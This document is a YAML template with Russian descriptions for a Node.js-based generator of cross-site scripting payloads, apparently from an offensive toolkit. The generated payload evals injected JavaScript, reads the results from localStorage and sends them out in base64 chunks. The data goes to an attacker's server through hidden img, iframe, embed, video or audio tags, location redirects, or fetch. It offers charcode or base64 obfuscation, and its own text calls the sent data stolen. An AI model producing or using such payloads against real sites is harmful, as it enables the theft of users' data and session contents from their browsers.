description: |-
  Генератор нагрузки для выполнения произвольного кода в браузере. Внедрять вместо alert(0).

  Забирает данные через localStorage по таймауту.
  
  Внутри внедряемого скрипта необходимо передать все требуемые данные в элемент localStorage:
      localStorage.setItem("exfltr", data)
  
  Пример fetch-цепочки:
      fetch(URL,OPTIONS).then(function(a){return(a.text())}).then(function(b){localStorage.setItem("exfltr",b)});

  Будет отправлять данные с помощью GET-запросов частями, если их много.
  При эксплуатации с помощью location нужно настроить принимающий сервер на долгий ответ (60000), чтобы перенаправление не произошло до отправки всех данных. 
author: vinzekatze
tags:
  - xss
  - payload
  - generator
  - exec
  - localStorage

arguments:
  server-url:
    default:
    description: >-
      URL 
    replacer: '#server_url#'

  js-file:
    description: >-
      путь до файла с внедряемым JS-кодом
    replacer: '#jsfile#'

  a:
    default:
      - img
      - iframe
      - embed
      - video
      - audio
      - location
      - fetch
    description: агент с помощью которого будет осуществляться запрос на отслеживающий сервер
    replacer: '#agent#'
  
  d:
    default: 500
    description: время задержки смены location при отправке разных частей данных
    replacer: '#delay#'
    metavar: ms
    regex: '\d+'

  t:
    default: 1500
    description: время задержки получения данных из localStorage после выполенения eval
    replacer: '#evaldelay#'
    metavar: ms
    regex: '\d+'
  e:
    default:
      - charcode
      - base64
      - none
    description: способ кодирования строк в нагрузке
    replacer: '#e#'
  
  quot:
    default:
      - apos
      - quot
      - grave
    description: тип кавычек, используемых для строк в JS
    replacer: '#quot#'
  
  loc-key:
    default: exfltr
    description: название элемента localStorage, откуда будут считываться данные для отправки
    metavar: PARAMETER
    replacer: '#local-key#'

  num-param:
    default: number
    description: GET-параметр, отвечающий за нумерацию отправляемой части данных (не применимо к fetch)
    metavar: PARAMETER
    replacer: '#num-param#'

  pld-param:
    default: payload
    description: GET-параметр, в котором будет отправляться похищенное в кодировке base64 (не применимо к fetch)
    metavar: PARAMETER
    replacer: '#payload-param#'
  
  head:
    default: 
      - body
      - head
    description: вставлять нагрузку в document.head вместо document.body (не применимо к location и fetch)
    replacer: '#pos#'
  
  btoa-fix:
    default:
      - 'N'
      - 'Y'
    description: кодировать данные с помощью URL encoding перед отправкой в btoa (применять если на выходе eval есть кириллица)
    replacer: '#btoa-fix#'

mode:
  format:
    server-url: '{0!r}'
    js-file: '{0!r}'
    loc-key: '{0!r}'
    num-param: '{0!r}'
    pld-param: '{0!r}'
    head: '{0!r}'
    e: '{0!r}'
    quot: '{0!r}'
  replace:
    quot:
      apos: "'"
      quot: '"'
      grave: '`'
    btoa-fix:
      N: >-
        btoa(localStorage.getItem(${ENC.lockey}))
      Y: >-
        btoa(encodeURIComponent(localStorage.getItem(${ENC.lockey})))
    a:  
      img: |-
        var strings = {
          elem1: `<img src="${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`,
          elem3: `" style="display:none">`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(i,${ENC.elem2},c,${ENC.elem3}))})},${evalDelay}))";

      iframe: |-
        var strings = {
          elem1: `<iframe src="${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`,
          elem3: `" style="display:none"></iframe>`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(i,${ENC.elem2},c,${ENC.elem3}))})},${evalDelay}))";
      embed: |-
        var strings = {
          elem1: `<embed src="${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`,
          elem3: `" style="display:none">`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(i,${ENC.elem2},c,${ENC.elem3}))})},${evalDelay}))";
      video: |-
        var strings = {
          elem1: `<video src="${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`,
          elem3: `"controls style="display:none"></video>`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(i,${ENC.elem2},c,${ENC.elem3}))})},${evalDelay}))";
      audio: |-
        var strings = {
          elem1: `<audio src="${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`,
          elem3: `"controls style="display:none"></audio>`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(i,${ENC.elem2},c,${ENC.elem3}))})},${evalDelay}))";   
      location: |
        var strings = {
          elem1: `${serverURL}?${numParam}=`,
          elem2: `&${payloadParam}=`
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){#btoa-fix#.match(RegExp(${ENC.datablockRegex},${ENC.g})).forEach(function(c,i){setTimeout(function(){if(localStorage.getItem(${randomNumber})==null){localStorage.setItem(${randomNumber},0)}if(localStorage.getItem(${randomNumber})==i){(localStorage.setItem(${randomNumber},i-(-1)),window.location.replace(${ENC.elem1}.concat(i,${ENC.elem2},c)))}},${locationDelay}*i)})},${evalDelay}))";
      fetch: |
        var strings = {
          elem1: `${serverURL}`,
          fetch1: `{"method":"POST","mode":"no-cors","body":"${payloadParam}=`,
          fetch2: '"}'
        };
        var payloadTemplate = "(eval(${ENC.jscode}),setTimeout(function(){fetch(${ENC.elem1},JSON.parse(${ENC.fetch1}.concat(#btoa-fix#,${ENC.fetch2})))},${evalDelay}))";
shell: node
script: |-
  const fs = require('fs');

  function MakeCharCode(pld) {
    let output_arr = [];
    let pld_arr = [...pld];
    pld_arr.forEach((i) => {
      output_arr.push(i.charCodeAt(0));
    });
    output = output_arr.join(",");
    return output;
  };

  function EncodePld(entype, pld) {
    let output = {};
    for (let key in pld) {
      let code = '';
      switch (entype) {
      case "charcode":
        code = MakeCharCode(pld[key]);
        output[key] = `String.fromCharCode(${code})`;
        break;
      case "base64":
        code = btoa(pld[key]);
        output[key] = `atob(${quot}${code}${quot})`;
        break;
      case "none":
        code = pld[key].replace(/[\'\"\`]/g, '\\$&');
        code = code.replace(/\n/g, "\\n");
        code = code.replace(/\t/g, "\\t");
        output[key] = `${quot}${code}${quot}`
      };
    };
    return output;
  };
  
  var quot = #quot#;
  var serverURL = #server_url#;
  var jsfile = #jsfile#;
  var lockey = #local-key#;
  var numParam = #num-param#;
  var payloadParam = #payload-param#;
  var position = #pos#;
  var datablockRegex = '.{1,1500}';
  var randomNumber = Math.round(Math.random()*1000);
  var locationDelay = #delay#;
  var evalDelay = #evaldelay#;

  // Чтение файла с кодом
  var jscode = fs.readFileSync(jsfile, { encoding: 'utf8', flag: 'r' });
  
  // Кодируемые элементы
  const bsc_strings = {
    position: "beforeend",
    g: "g",
    jscode: jscode,
    lockey: lockey,
    datablockRegex: datablockRegex
  };

  #agent#

  // Сборка полной нагрузки
  all_strings = {...strings, ...bsc_strings};
  ENC = EncodePld(#e#, all_strings);
  payload = eval(`\`${payloadTemplate}\``);

  console.log(payload);